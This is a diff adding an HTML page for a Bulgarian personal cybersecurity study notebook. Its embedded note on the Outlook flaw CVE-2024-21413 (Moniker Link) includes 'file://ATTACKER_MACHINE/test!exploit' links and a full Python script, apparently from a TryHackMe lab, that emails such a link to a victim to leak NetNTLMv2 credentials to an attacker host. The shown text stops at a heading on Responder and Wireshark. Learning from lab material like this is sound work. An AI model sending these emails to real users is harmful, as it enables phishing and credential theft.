@@ -1,0 +1,684 @@
+<!doctype html>
+<html lang="bg">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" content="#100c0f">
+  <link rel="icon" type="image/png" href="images/red-team-icon.png">
+  <title>Cybersecurity notebook</title>
+  <style>
+    :root {
+      color-scheme: dark;
+      --bg: #100c0f;
+      --panel: #191417;
+      --panel-2: #24191e;
+      --line: #3b292f;
+      --text: #f4eef0;
+      --muted: #b2a0a6;
+      --green: #ff5148;
+      --green-2: #e6322b;
+      --amber: #ffbd70;
+      --red: #ff8a80;
+      --shadow: 0 18px 50px #0005;
+      font-family: Inter, ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", sans-serif;
+    }
+    * { box-sizing: border-box; }
+    html, body { width: 100%; max-width: 100%; overflow-x: hidden; }
+    body { margin: 0; min-height: 100vh; background: radial-gradient(ellipse at 68% -18%, #551716 0, transparent 45%), linear-gradient(rgba(255, 70, 64, .035) 1px, transparent 1px), linear-gradient(90deg, rgba(255, 70, 64, .035) 1px, transparent 1px), linear-gradient(145deg, #151013, #0e0b0e 62%, #1c0e11); background-size: auto, 38px 38px, 38px 38px, auto; color: var(--text); }
+    button, input, select, textarea { font: inherit; }
+    button { color: inherit; }
+    a { color: var(--green); }
+    .app { width: 100%; max-width: 100vw; min-height: 100vh; display: grid; grid-template-columns: 258px minmax(0, 1fr); overflow-x: clip; }
+    .sidebar { border-right: 1px solid var(--line); background: #100d10f2; padding: 24px 15px 18px; display: flex; flex-direction: column; gap: 24px; }
+    .brand { display: flex; gap: 12px; align-items: center; padding: 0 9px; }
+    .brand-mark { display: grid; place-items: center; flex: 0 0 42px; width: 42px; height: 42px; overflow: hidden; border: 1px solid #67282d; border-radius: 11px; background: #030303; box-shadow: 0 0 24px #f0443a26; }
+    .brand-mark img { display: block; width: 100%; height: 100%; object-fit: cover; }
+    .brand-name { font-size: 16px; font-weight: 720; letter-spacing: .01em; }
+    .brand-caption { margin-top: 3px; color: var(--muted); font-size: 13px; }
+    .nav-label { padding: 0 10px; margin: 0 0 7px; color: #a18a91; font-size: 12px; font-weight: 800; letter-spacing: .13em; text-transform: uppercase; }
+    .nav-list { display: grid; gap: 4px; }
+    .nav-button, .subnav-button { border: 0; width: 100%; cursor: pointer; background: transparent; color: #c7b8bd; text-align: left; display: flex; align-items: center; gap: 10px; border-radius: 9px; transition: .16s ease; }
+    .nav-button { padding: 10px 11px; font-size: 15px; }
+    .nav-button:hover, .subnav-button:hover { background: #281b20; color: var(--text); }
+    .nav-button.active, .subnav-button.active { color: var(--green); background: #35191e; }
+    .nav-icon { width: 18px; text-align: center; color: #b17b82; font-size: 17px; }
+    .nav-button.active .nav-icon { color: var(--green); }
+    .nav-count { margin-left: auto; border: 1px solid #50353c; border-radius: 20px; padding: 1px 7px; color: #b8a1a7; font-size: 12px; }
+    .subnav { display: grid; margin: 3px 0 5px 18px; padding-left: 9px; border-left: 1px solid #50353c; gap: 2px; }
+    .subnav-button { padding: 7px 8px; font-size: 14px; }
+    .sidebar-bottom { margin-top: auto; display: grid; gap: 10px; }
+    .local-note { padding: 12px; border: 1px solid var(--line); border-radius: 11px; background: #1a1417; color: var(--muted); font-size: 13px; line-height: 1.55; }
+    .local-note strong { color: var(--green); display: block; margin-bottom: 3px; }
+    .backup-actions { display: flex; gap: 7px; }
+    .small-button { cursor: pointer; border: 1px solid var(--line); border-radius: 8px; background: transparent; color: #c6b5ba; padding: 7px 9px; font-size: 13px; flex: 1; }
+    .small-button:hover { border-color: #8b4249; color: var(--text); }
+    .main { min-width: 0; max-width: 100%; overflow-x: hidden; padding: 27px clamp(20px, 4vw, 58px) 60px; }
+    .topbar { display: flex; justify-content: space-between; align-items: center; gap: 16px; max-width: 1180px; margin: 0 auto 35px; }
+    .breadcrumb { color: var(--muted); font-size: 14px; }
+    .breadcrumb span { color: var(--text); }
+    .top-actions { display: flex; gap: 9px; align-items: center; }
+    .search-wrap { position: relative; }
+    .search-wrap input { width: min(260px, 35vw); padding: 9px 12px 9px 34px; color: var(--text); background: #1a1417; border: 1px solid var(--line); border-radius: 9px; outline: none; font-size: 14px; }
+    .search-wrap input:focus { border-color: #d35c5d; box-shadow: 0 0 0 3px #ff51481a; }
+    .search-icon { position: absolute; left: 12px; top: 7px; color: #aa8c92; font-size: 16px; }
+    .primary-button { display: inline-flex; align-items: center; justify-content: center; gap: 7px; padding: 9px 13px; border: 1px solid var(--green); border-radius: 9px; color: #1a0c0e; background: var(--green); font-weight: 750; font-size: 14px; cursor: pointer; transition: .15s ease; }
+    .primary-button:hover { background: #ff756d; transform: translateY(-1px); }
+    .content { width: 100%; min-width: 0; max-width: 1180px; margin: 0 auto; }
+    .hero { position: relative; overflow: hidden; padding: clamp(25px, 5vw, 54px); border: 1px solid #573239; border-radius: 19px; background: linear-gradient(112deg, #2b171c 0%, #1d1418 58%, #271316 100%); box-shadow: var(--shadow); }
+    .hero::after { content: ""; position: absolute; width: 260px; height: 260px; border-radius: 50%; right: -58px; top: -118px; border: 1px solid #ff51481d; box-shadow: 0 0 0 27px #ff51480b, 0 0 0 56px #ff514808; }
+    .eyebrow { color: var(--green); font-size: 12px; font-weight: 850; letter-spacing: .16em; text-transform: uppercase; }
+    h1 { margin: 12px 0 10px; max-width: 720px; font-size: clamp(31px, 5vw, 49px); letter-spacing: -.045em; line-height: 1.08; }
+    .hero-copy { max-width: 630px; margin: 0; color: #c9b9bd; font-size: 16px; line-height: 1.7; }
+    .hero-footer { display: flex; align-items: center; gap: 11px; margin-top: 26px; color: #b79da3; font-size: 13px; }
+    .pulse { width: 7px; height: 7px; border-radius: 50%; background: var(--green-2); box-shadow: 0 0 12px var(--green-2); }
+    .stats { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; margin: 16px 0 34px; }
+    .stat-card { padding: 17px 19px; border: 1px solid var(--line); border-radius: 12px; background: #191417; }
+    .stat-value { font-size: 24px; letter-spacing: -.03em; font-weight: 750; }
+    .stat-label { color: var(--muted); font-size: 13px; margin-top: 4px; }
+    .section-heading { display: flex; justify-content: space-between; align-items: end; gap: 15px; margin: 0 0 13px; }
+    .section-heading h2 { margin: 0; font-size: 19px; letter-spacing: -.02em; }
+    .section-heading p { margin: 5px 0 0; color: var(--muted); font-size: 13px; }
+    .topic-grid { display: grid; grid-template-columns: repeat(3, minmax(0, 1fr)); gap: 12px; }
+    .topic-card { display: block; text-align: left; cursor: pointer; padding: 17px; border: 1px solid var(--line); border-radius: 13px; background: #191417; transition: .16s ease; }
+    .topic-card:hover { transform: translateY(-2px); border-color: #83434a; background: #21171b; }
+    .topic-card-top { display: flex; justify-content: space-between; align-items: center; }
+    .topic-symbol { display: grid; place-items: center; width: 33px; height: 33px; border-radius: 10px; color: var(--green); background: #3b2026; font-size: 17px; }
+    .topic-arrow { color: #a77a80; }
+    .topic-card h3 { margin: 14px 0 5px; font-size: 16px; }
+    .topic-card p { margin: 0; min-height: 32px; color: var(--muted); font-size: 13px; line-height: 1.5; }
+    .topic-meta { display: flex; justify-content: space-between; margin-top: 14px; color: #ab979c; font-size: 12px; }
+    .page-head { margin: 3px 0 22px; }
+    .page-head .eyebrow { margin-bottom: 8px; }
+    .page-head h1 { font-size: clamp(29px, 4vw, 38px); margin: 0; }
+    .page-head p { max-width: 690px; color: var(--muted); line-height: 1.6; font-size: 15px; }
+    .tabs { display: flex; gap: 6px; overflow-x: auto; border-bottom: 1px solid var(--line); margin: 20px 0 17px; }
+    .tab-button { cursor: pointer; white-space: nowrap; border: 0; border-bottom: 2px solid transparent; color: #b19ca2; background: transparent; padding: 10px 13px; font-size: 14px; }
+    .tab-button:hover { color: var(--text); }
+    .tab-button.active { color: var(--green); border-bottom-color: var(--green); }
+    .content-toolbar { display: flex; align-items: center; justify-content: space-between; gap: 15px; margin: 0 0 13px; }
+    .content-toolbar p { margin: 0; color: var(--muted); font-size: 13px; }
+    .filter-select { padding: 7px 9px; border: 1px solid var(--line); border-radius: 8px; background: #191417; color: #c2afb4; font-size: 13px; }
+    .note-list { display: grid; gap: 10px; }
+    .note-card { width: 100%; min-width: 0; max-width: 100%; padding: 16px 18px; border: 1px solid var(--line); border-radius: 12px; background: #191417; }
+    .note-top { display: flex; justify-content: space-between; gap: 10px; align-items: flex-start; }
+    .note-card h3 { margin: 0; font-size: 16px; }
+    .note-card p { margin: 9px 0 0; color: #c5b6ba; font-size: 14px; line-height: 1.7; white-space: pre-wrap; overflow-wrap: anywhere; }
+    .note-body { display: block; width: 100%; min-width: 0; max-width: 100%; margin-top: 9px; color: #c5b6ba; font-size: 14px; line-height: 1.72; overflow-wrap: anywhere; word-break: break-word; }
+    .note-body > :first-child { margin-top: 0; }
+    .note-body > :last-child { margin-bottom: 0; }
+    .note-body p { display: block; width: 100%; max-width: 100%; margin: 10px 0; color: #c5b6ba; font-size: 14px; line-height: 1.72; white-space: normal; overflow-wrap: anywhere; word-break: break-word; }
+    .note-body h4 { margin: 22px 0 8px; color: #f0e3e6; font-size: 16px; }
+    .note-body ul, .note-body ol { margin: 8px 0 14px; padding-left: 21px; color: #c5b6ba; }
+    .note-body li { margin: 5px 0; }
+    .note-body strong { color: #f4e7e9; }
+    .note-body code { border: 1px solid #4a3037; border-radius: 4px; padding: 1px 4px; color: #ffaca5; background: #130f11; font: 13px ui-monospace, SFMono-Regular, Consolas, monospace; }
+    .code-block { --code-accent: #ff5148; --code-head: #211518; --code-bg: #110e10; --code-text: #e0d2d6; --syntax-keyword: #ff817a; --syntax-string: #f5c86b; --syntax-function: #72d4e9; --syntax-variable: #c6a5ff; --syntax-number: #f4a77d; --syntax-comment: #9c8c91; --syntax-tag: #ff9b65; --syntax-attribute: #c4b1ff; width: 100%; max-width: 100%; min-width: 0; overflow: hidden; margin: 13px 0; border: 1px solid #3d2b31; border-left: 3px solid var(--code-accent); border-radius: 9px; background: var(--code-bg); }
+    .code-label { display: flex; align-items: center; gap: 7px; padding: 7px 10px; border-bottom: 1px solid #35252b; color: var(--code-accent); background: var(--code-head); font-size: 11px; letter-spacing: .08em; text-transform: uppercase; }
+    .code-label::before { content: ""; width: 7px; height: 7px; flex: 0 0 7px; border-radius: 50%; background: var(--code-accent); box-shadow: 0 0 9px color-mix(in srgb, var(--code-accent) 55%, transparent); }
+    .code-block pre { overflow: auto; margin: 0; padding: 12px; color: var(--code-text); font: 13px/1.65 ui-monospace, SFMono-Regular, Consolas, monospace; tab-size: 4; }
+    .code-block.theme-python { --code-accent: #55b7e8; --code-head: #142632; --code-bg: #0d171e; --code-text: #c8eafb; --syntax-keyword: #75c7ff; --syntax-string: #f5cf78; --syntax-function: #c6a5ff; --syntax-variable: #71e2d0; }
+    .code-block.theme-markup { --code-accent: #f0a24e; --code-head: #302114; --code-bg: #19120c; --code-text: #f4ddbd; --syntax-keyword: #ff9b65; --syntax-string: #a8d88d; --syntax-function: #ffc875; --syntax-variable: #c4b1ff; --syntax-tag: #ff9b65; --syntax-attribute: #8cc9ff; }
+    .code-block.theme-yara { --code-accent: #bd91ff; --code-head: #281d38; --code-bg: #15111d; --code-text: #e2d4fa; --syntax-keyword: #c6a0ff; --syntax-string: #9edb9d; --syntax-function: #70d7e4; --syntax-variable: #ff897f; }
+    .code-block.theme-linux { --code-accent: #ff6259; --code-head: #301719; --code-bg: #190f11; --code-text: #f1d0d0; --syntax-keyword: #ff7770; --syntax-string: #f4cd72; --syntax-function: #ff9d68; --syntax-variable: #8bd8e8; }
+    .code-block.theme-windows { --code-accent: #69adff; --code-head: #15283b; --code-bg: #0e151d; --code-text: #d2e5ff; --syntax-keyword: #73b8ff; --syntax-string: #ffd176; --syntax-function: #b5d5ff; --syntax-variable: #83dfd3; }
+    .code-block.theme-javascript { --code-accent: #f0d15a; --code-head: #302b17; --code-bg: #19170f; --code-text: #f2ebc8; --syntax-keyword: #f0d15a; --syntax-string: #a8d88d; --syntax-function: #80d9e8; --syntax-variable: #e6adff; }
+    .code-block.theme-sql { --code-accent: #cb9bff; --code-head: #281c36; --code-bg: #15111c; --code-text: #e2d4fa; --syntax-keyword: #c6a0ff; --syntax-string: #9edb9d; --syntax-function: #72d4e9; --syntax-variable: #ff9b65; }
+    .code-block .tok-keyword { color: var(--syntax-keyword); font-weight: 650; }
+    .code-block .tok-string { color: var(--syntax-string); }
+    .code-block .tok-function { color: var(--syntax-function); }
+    .code-block .tok-variable { color: var(--syntax-variable); }
+    .code-block .tok-number { color: var(--syntax-number); }
+    .code-block .tok-comment { color: var(--syntax-comment); font-style: italic; }
+    .code-block .tok-tag { color: var(--syntax-tag); font-weight: 650; }
+    .code-block .tok-attribute { color: var(--syntax-attribute); }
+    .code-block .tok-operator { color: var(--code-accent); }
+    .code-block code { padding: 0; border: 0; color: inherit; background: transparent; font: inherit; }
+    .table-scroll { width: 100%; max-width: 100%; min-width: 0; overflow-x: auto; margin: 12px 0; border: 1px solid var(--line); border-radius: 9px; }
+    .note-body table { width: 100%; max-width: 100%; border-collapse: collapse; table-layout: fixed; min-width: 500px; font-size: 13px; }
+    .note-body th, .note-body td { min-width: 0; padding: 9px 11px; border-bottom: 1px solid #3a292f; text-align: left; vertical-align: top; white-space: normal; overflow-wrap: anywhere; word-break: break-word; }
+    .note-body th { color: #eadde0; background: #2b1b20; font-weight: 700; }
+    .note-body tr:last-child td { border-bottom: 0; }
+    .note-figure { width: fit-content; max-width: min(680px, 100%); margin: 14px auto; padding: 10px; border: 1px solid var(--line); border-radius: 10px; background: #130f11; }
+    .image-preview { display: block; max-width: 100%; margin: 0 auto; padding: 0; overflow: hidden; border: 0; border-radius: 6px; background: transparent; cursor: zoom-in; }
+    .note-figure img { display: block; width: auto; max-width: 100%; max-height: 400px; height: auto; margin: 0 auto; border-radius: 6px; object-fit: contain; transition: filter .15s ease; }
+    .image-preview:hover img { filter: brightness(1.08); }
+    .note-figure figcaption { margin-top: 8px; color: #b09ca1; font-size: 12px; line-height: 1.5; }
+    #image-viewer { position: fixed; inset: 50% auto auto 50%; transform: translate(-50%, -50%); margin: 0; width: min(92vw, 1320px); max-width: 92vw; max-height: 94vh; overflow: auto; padding: 48px 18px 18px; border: 1px solid #a34b54; border-radius: 13px; background: #100c0f; box-shadow: 0 24px 90px #000d; }
+    #image-viewer img { display: block; width: min(86vw, 1200px); max-width: 100%; max-height: 82vh; height: auto; margin: 0 auto; object-fit: contain; }
+    #image-viewer figcaption { margin: 10px auto 0; color: #c5b6ba; text-align: center; font-size: 14px; line-height: 1.5; }
+    .image-viewer-close { position: absolute; z-index: 2; top: 9px; right: 10px; display: grid; place-items: center; width: 32px; height: 32px; border: 1px solid #a34b54; border-radius: 8px; color: #fff; background: #35191e; cursor: pointer; }
+    .resource-list { display: grid; gap: 7px; margin: 9px 0 0; padding-left: 18px; color: #c5b6ba; font-size: 13px; }
+    .resource-list a { text-decoration: none; }
+    .resource-list a:hover { text-decoration: underline; }
+    .note-meta { display: flex; flex-wrap: wrap; align-items: center; gap: 7px; margin-top: 12px; color: #ad999f; font-size: 12px; }
+    .pill { padding: 3px 7px; border: 1px solid #53333a; border-radius: 20px; color: #ffaaa3; background: #2b191e; }
+    .note-actions { display: flex; gap: 5px; flex: 0 0 auto; }
+    .icon-button { cursor: pointer; border: 1px solid transparent; border-radius: 7px; color: #ab969c; background: transparent; padding: 5px 7px; font-size: 13px; }
+    .icon-button:hover { border-color: var(--line); color: var(--text); }
+    .icon-button.delete:hover { color: var(--red); }
+    .note-source { color: var(--green); text-decoration: none; }
+    .note-source:hover { text-decoration: underline; }
+    .empty-state { padding: 42px 20px; text-align: center; border: 1px dashed #4a343a; border-radius: 13px; background: #151114; }
+    .empty-icon { display: grid; place-items: center; margin: 0 auto 12px; width: 42px; height: 42px; border-radius: 13px; background: #351c22; color: var(--green); font-size: 21px; }
+    .empty-state h3 { margin: 0; font-size: 16px; }
+    .empty-state p { margin: 7px auto 15px; max-width: 410px; color: var(--muted); font-size: 13px; line-height: 1.6; }
+    .cve-list { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 10px; }
+    .cve-item { cursor: pointer; padding: 15px; text-align: left; border: 1px solid var(--line); border-radius: 11px; background: #191417; }
+    .cve-item:hover { border-color: #8b444b; }
+    .cve-id { color: var(--green); font: 700 15px ui-monospace, SFMono-Regular, Consolas, monospace; }
+    .cve-summary { margin-top: 6px; color: var(--muted); font-size: 13px; }
+    .cve-meta { margin-top: 10px; color: #aa969b; font-size: 12px; }
+    dialog { width: min(620px, calc(100% - 28px)); max-height: min(90vh, 850px); overflow-y: auto; border: 1px solid #54363d; border-radius: 15px; padding: 0; background: #191316; color: var(--text); box-shadow: 0 30px 100px #000a; }
+    dialog::backdrop { background: #090608cc; backdrop-filter: blur(4px); }
+    .dialog-head { position: sticky; top: 0; z-index: 2; display: flex; justify-content: space-between; align-items: center; padding: 17px 20px; border-bottom: 1px solid var(--line); background: #191316; }
+    .dialog-head h2 { margin: 0; font-size: 17px; }
+    .dialog-body { display: grid; gap: 13px; padding: 19px 20px 21px; }
+    .field { display: grid; gap: 6px; }
+    .field label { color: #d0bec3; font-size: 13px; font-weight: 700; }
+    .field input, .field select, .field textarea { width: 100%; color: var(--text); border: 1px solid var(--line); border-radius: 8px; outline: 0; background: #120f11; padding: 9px 10px; font-size: 14px; }
+    .field textarea { min-height: 145px; resize: vertical; line-height: 1.6; }
+    .field input:focus, .field select:focus, .field textarea:focus { border-color: #d35c5d; box-shadow: 0 0 0 3px #ff514816; }
+    .field-hint { color: #a18d93; font-size: 12px; }
+    .form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 11px; }
+    .dialog-footer { display: flex; justify-content: flex-end; gap: 8px; padding: 0 20px 19px; }
+    .secondary-button { cursor: pointer; padding: 9px 13px; border: 1px solid var(--line); border-radius: 9px; color: #c6b5ba; background: transparent; font-size: 14px; }
+    .toast { position: fixed; z-index: 10; bottom: 22px; left: 50%; transform: translate(-50%, 20px); opacity: 0; pointer-events: none; border: 1px solid #754047; border-radius: 9px; color: var(--text); background: #29191e; padding: 10px 14px; box-shadow: var(--shadow); font-size: 14px; transition: .2s; }
+    .toast.show { opacity: 1; transform: translate(-50%, 0); }
+    .mobile-menu { display: none; }
+    @media (max-width: 850px) {
+      .app { grid-template-columns: 220px minmax(0, 1fr); }
+      .topic-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+    }
+    @media (max-width: 640px) {
+      .app { display: block; }
+      .sidebar { display: none; position: fixed; inset: 0 auto 0 0; z-index: 8; width: min(290px, 85vw); box-shadow: var(--shadow); }
+      .sidebar.open { display: flex; }
+      .main { padding: 18px 15px 42px; }
+      .topbar { margin-bottom: 23px; }
+      .mobile-menu { display: inline-grid; place-items: center; width: 35px; height: 35px; border: 1px solid var(--line); border-radius: 8px; background: #1a1417; cursor: pointer; }
+      .breadcrumb { display: flex; align-items: center; gap: 9px; }
+      .search-wrap input { width: 39px; padding-right: 5px; transition: .2s; }
+      .search-wrap input:focus { width: min(210px, 52vw); }
+      .search-wrap input::placeholder { color: transparent; }
+      .search-wrap input:focus::placeholder { color: #a38c92; }
+      .search-icon { pointer-events: none; }
+      .top-actions { gap: 6px; }
+      .top-actions .primary-button { padding: 9px 10px; font-size: 0; }
+      .top-actions .primary-button span { font-size: 20px; }
+      .hero { padding: 26px 21px; }
+      .stats { gap: 7px; }
+      .stat-card { padding: 13px 11px; }
+      .stat-value { font-size: 21px; }
+      .stat-label { font-size: 11px; }
+      .topic-grid { grid-template-columns: 1fr; }
+      .cve-list { grid-template-columns: 1fr; }
+      .form-row { grid-template-columns: 1fr; }
+    }
+  </style>
+</head>
+<body>
+  <div class="app">
+    <aside class="sidebar" id="sidebar">
+      <div class="brand">
+        <div class="brand-mark"><img src="images/red-team-icon.png" alt="Икона Red Team"></div>
+        <div><div class="brand-name">Cybersecurity notebook</div><div class="brand-caption">Личен учебен дневник</div></div>
+      </div>
+      <nav aria-label="Основна навигация">
+        <p class="nav-label">Работно място</p>
+        <div class="nav-list">
+          <button class="nav-button active" data-page="home"><span class="nav-icon">⌂</span>Начало</button>
+          <button class="nav-button" data-page="topic:metasploit"><span class="nav-icon">◈</span>Metasploit <span class="nav-count" id="metasploit-count">0</span></button>
+          <div class="subnav" id="metasploit-subnav">
+            <button class="subnav-button" data-page="topic:metasploit:overview">Представлява</button>
+            <button class="subnav-button" data-page="topic:metasploit:commands">Команди</button>
+            <button class="subnav-button" data-page="topic:metasploit:posts">Публикации</button>
+          </div>
+          <button class="nav-button" data-page="cves"><span class="nav-icon">⌕</span>CVE <span class="nav-count" id="cve-count">0</span></button>
+          <div class="subnav" id="cve-subnav"></div>
+          <button class="nav-button" data-page="all-posts"><span class="nav-icon">▤</span>Всички публикации <span class="nav-count" id="posts-count">0</span></button>
+          <button class="nav-button" data-page="all-notes"><span class="nav-icon">▧</span>Всички бележки <span class="nav-count" id="notes-count">0</span></button>
+        </div>
+      </nav>
+      <div class="sidebar-bottom">
+        <div class="local-note"><strong>Личен дневник</strong>Данните се пазят локално в този браузър. Използвай резервно копие, за да ги прехвърлиш.</div>
+        <div class="backup-actions"><button class="small-button" id="export-button">↓ Резервно копие</button><button class="small-button" id="import-button">↑ Импортирай</button><input type="file" id="import-file" accept="application/json,.json" hidden></div>
+      </div>
+    </aside>
+    <main class="main">
+      <header class="topbar">
+        <div class="breadcrumb"><button class="mobile-menu" id="mobile-menu" aria-label="Отвори меню">☰</button><span id="breadcrumb">Начало</span></div>
+        <div class="top-actions">
+          <div class="search-wrap"><span class="search-icon">⌕</span><input type="search" id="search" placeholder="Търси бележки…" aria-label="Търси бележки"></div>
+          <button class="primary-button" id="add-button"><span>＋</span> Добави</button>
+        </div>
+      </header>
+      <div class="content" id="content"></div>
+    </main>
+  </div>
+  <dialog id="entry-dialog">
+    <form id="entry-form">
+      <div class="dialog-head"><h2 id="dialog-title">Нова бележка</h2><button type="button" class="icon-button" id="close-dialog" aria-label="Затвори">✕</button></div>
+      <div class="dialog-body">
+        <div class="field"><label for="entry-title">Заглавие</label><input id="entry-title" name="title" required maxlength="140" placeholder="Например: CVE-2024-21413"></div>
+        <div class="form-row">
+          <div class="field"><label for="entry-type">Вид материал</label><select id="entry-type" name="type"><option value="note">Обяснение / бележка</option><option value="command">Команда</option><option value="post">Публикация / статия</option><option value="cve">CVE</option></select></div>
+          <div class="field" id="topic-field"><label for="entry-topic">Тема</label><input id="entry-topic" name="topic" list="topic-options" placeholder="Metasploit, Linux, Networking…" value="Metasploit"><datalist id="topic-options"><option value="Metasploit"><option value="Linux"><option value="Networking"><option value="Web"><option value="TryHackMe"></datalist></div>
+        </div>
+        <div class="form-row">
+          <div class="field"><label for="entry-source-name">Източник</label><select id="entry-source-name" name="sourceName"><option value="">Не е посочен</option><option>TryHackMe</option><option>YouTube</option><option>Reddit</option><option>X</option><option>Друга платформа</option></select></div>
+          <div class="field"><label for="entry-url">Линк към източника</label><input id="entry-url" name="url" type="url" placeholder="https://…"></div>
+        </div>
+        <div class="field"><label for="entry-content">Съдържание на български</label><textarea id="entry-content" name="content" required placeholder="Добави преведения и подреден материал тук. Запази техническите термини, когато е уместно."></textarea><div class="field-hint">Командите се запазват дословно. CVE се показват като отделни страници в раздела CVE.</div></div>
+      </div>
+      <div class="dialog-footer"><button type="button" class="secondary-button" id="cancel-dialog">Отказ</button><button type="submit" class="primary-button">Запази бележката</button></div>
+    </form>
+  </dialog>
+  <dialog id="image-viewer" aria-label="Преглед на изображение">
+    <button type="button" class="image-viewer-close" id="image-viewer-close" aria-label="Затвори">✕</button>
+    <img id="image-viewer-image" alt="">
+    <figcaption id="image-viewer-caption"></figcaption>
+  </dialog>
+  <div class="toast" id="toast" role="status"></div>
+  <script src="metasploit-notes.js"></script>
+  <script>
+    // Бележките, подадени в чата, се добавят тук. При следващо отваряне новите записи
+    // се обединяват с локалните, така че личните бележки в браузъра да се запазят.
+    const CHAT_ENTRIES = [{
+      id: "cve-2024-21413",
+      title: "CVE-2024-21413 — Microsoft Outlook (Moniker Link)",
+      type: "cve",
+      topic: "CVE",
+      sourceName: "TryHackMe",
+      url: "https://www.cve.org/CVERecord?id=CVE-2024-21413",
+      createdAt: "25.10.2026",
+      content: "Критична уязвимост в Microsoft Outlook, свързана с обработката на Moniker Link. При кликване върху специално създаден линк Outlook може да опита SMB връзка и да разкрие NetNTLMv2 challenge-response. Посоченият CVSS резултат е 9.8. Записът включва засегнатите версии, лабораторния сценарий, откриването и мерките за защита.",
+      blocks: [
+        { type: "heading", text: "Общ преглед" },
+        { type: "paragraph", text: "На 13 февруари 2024 г. Microsoft обявява уязвимост в Microsoft Outlook с възможност за Remote Code Execution (RCE) и изтичане на идентификационни данни. Уязвимостта получава идентификатора CVE-2024-21413. За откриването ѝ е посочен Haifei Li от Check Point Research." },
+        { type: "paragraph", text: "Уязвимостта засяга начина, по който Outlook обработва определен тип хипервръзки, наречени Moniker Links. В описания сценарий жертвата получава имейл със специално създаден линк. Ако го отвори, Outlook може да опита да се свърже с SMB споделяне и да изпрати NTLM authentication данни към отдалечената система." },
+        { type: "table", headers: ["Показател", "Детайли"], rows: [
+          ["Дата на публикуване", "13 февруари 2024 г."],
+          ["Въздействие", "Remote Code Execution (RCE) и изтичане на идентификационни данни"],
+          ["Тежест", "Critical"],
+          ["Attack Complexity", "Low"],
+          ["CVSS резултат", "9.8"],
+          ["Microsoft Security Response Center", "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2024-21413"]
+        ] },
+        { type: "heading", text: "Засегнати версии на Office" },
+        { type: "table", headers: ["Издание", "Засегнати версии"], rows: [
+          ["Microsoft Office LTSC 2021", "От версия 19.0.0"],
+          ["Microsoft 365 Apps for Enterprise", "От версия 16.0.1"],
+          ["Microsoft Office 2019", "От версия 16.0.1"],
+          ["Microsoft Office 2016", "От версия 16.0.0 до преди 16.0.5435.1001"]
+        ] },
+        { type: "heading", text: "Как работи уязвимостта" },
+        { type: "paragraph", text: "Outlook може да показва имейли като HTML и да обработва HTTP и HTTPS линкове. Може да отваря и URL адреси, които задействат Windows приложения — т.нар. Moniker Links. Обикновено Outlook показва предупреждение, когато линкът се опитва да стартира външно приложение." },
+        { type: "paragraph", text: "Protected View отваря имейли с прикачени файлове, хипервръзки и подобно съдържание в режим само за четене и блокира потенциално опасно поведение, например макроси от външни източници. Приложената снимка показва примерен диалог за сигурност на Outlook при Moniker Link." },
+        { type: "image", src: "images/outlook-security-warning.png", alt: "Предупреждение за сигурност на Microsoft Outlook при Moniker Link", caption: "Пример за предупреждение на Outlook. Текстът гласи, че местоположението може да е опасно и пита дали да се продължи. Показаният skype: Moniker е илюстративен, не е payload-ът от CVE-2024-21413." },
+        { type: "paragraph", text: "Използването на file:// Moniker Link може да накара Outlook да опита достъп до файл в мрежово споделяне. SMB използва локални идентификационни данни за authentication. Protected View обичайно спира този опит. Уязвимостта се задейства чрез добавяне на специалния символ ! и допълнителен текст в Moniker Link, което заобикаля тази защита." },
+        { type: "code", language: "HTML · обикновен file:// линк", text: `<p><a href="file://ATTACKER_MACHINE/test">Отвори линка</a></p>` },
+        { type: "code", language: "HTML · пример от описания сценарий", text: `<p><a href="file://ATTACKER_MACHINE/test!exploit">Отвори линка</a></p>` },
+        { type: "paragraph", text: "В учебния сценарий мрежовото споделяне не е задължително да съществува. При опит за достъп SMB authentication може да бъде задействан така или иначе и NetNTLMv2 challenge-response на жертвата да бъде изпратен към системата на атакуващия. Това е лабораторен пример за разпознаване на риска; изпълнявай подобни действия само в изрично разрешена среда." },
+        { type: "paragraph", text: "RCE се свързва с използването на Component Object Model (COM) от Moniker Links в Windows. Учебният материал посочва, че към момента на публикуването му не е имало публично достъпен proof of concept за RCE чрез конкретния CVE." },
+        { type: "heading", text: "Лабораторен PoC за изпращане на имейл" },
+        { type: "paragraph", text: "Примерният Python скрипт сглобява HTML имейл с Moniker Link и го изпраща през SMTP сървър. Адресите и името на сървъра са placeholders за лабораторната среда. В описаната TryHackMe стая за акаунта attacker@monikerlink.thm е дадена лабораторната парола attacker." },
+        { type: "list", items: [
+          "Задават се имейл адресите на подателя и получателя.",
+          "Паролата се въвежда интерактивно.",
+          "HTML съдържанието включва Moniker Link.",
+          "Създават се Subject, From и To полетата.",
+          "Скриптът се удостоверява пред SMTP сървъра и изпраща съобщението."
+        ] },
+        { type: "code", language: "Python · PoC от подадения учебен материал", text: `'''
+Автор: CMNatic | https://github.com/cmnatic
+Версия: 1.0 | 19.02.2024
+'''
+
+import smtplib
+from email.mime.text import MIMEText
+from email.mime.multipart import MIMEMultipart
+from email.utils import formataddr
+
+sender_email = 'attacker@monikerlink.thm' # Замени с имейл адреса на подателя
+receiver_email = 'victim@monikerlink.thm' # Замени с имейл адреса на получателя
+password = input("Въведи паролата за имейла на подателя: ")
+html_content = """\\
+<!DOCTYPE html>
+<html lang="bg">
+    <p><a href="file://ATTACKER_MACHINE/test!exploit">Отвори линка</a></p>
+
+    </body>
+</html>"""
+
+message = MIMEMultipart()
+message['Subject'] = "CVE-2024-21413"
+message["From"] = formataddr(('CMNatic', sender_email))
+message["To"] = receiver_email
+
+# Преобразува HTML низа в байтове и я прикачва към съобщението
+msgHtml = MIMEText(html_content,'html')
+message.attach(msgHtml)
+
+server = smtplib.SMTP('MAILSERVER', 25)
+server.ehlo()
+try:
+    server.login(sender_email, password)
+except Exception as err:
+    print(err)
+    exit(-1)
+
+try:
+    server.sendmail(sender_email, [receiver_email], message.as_string())
+    print("\\n Имейлът е доставен")
+except Exception as error:
+    print(error)
+finally:
+    server.quit()` },
+        { type: "heading", text: "Наблюдение с Responder и Wireshark" },
